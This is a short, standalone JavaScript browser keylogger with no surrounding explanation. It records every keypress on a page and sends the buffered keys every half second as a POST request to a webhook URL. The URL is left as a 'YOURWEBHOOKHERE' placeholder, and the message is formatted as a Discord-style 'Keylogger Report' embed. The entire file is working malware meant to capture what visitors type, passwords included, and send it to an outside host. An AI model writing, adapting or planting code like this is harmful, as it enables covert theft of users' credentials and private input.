const webhookUrl = "YOURWEBHOOKHERE";

let keys = '';
document.addEventListener('keypress', (event) => {
  keys += event.key;
});

setInterval(() => {
  if (keys !== '') {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', webhookUrl);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
      embeds: [{
        title: ":lock: Keylogger Report",
        description: ":cookie: The following keys were pressed:",
        color: 16711680, 
        fields: [{
          name: "Keys",
          value: keys
        }]
      }]
    }));
    keys = '';
  }
}, 500);
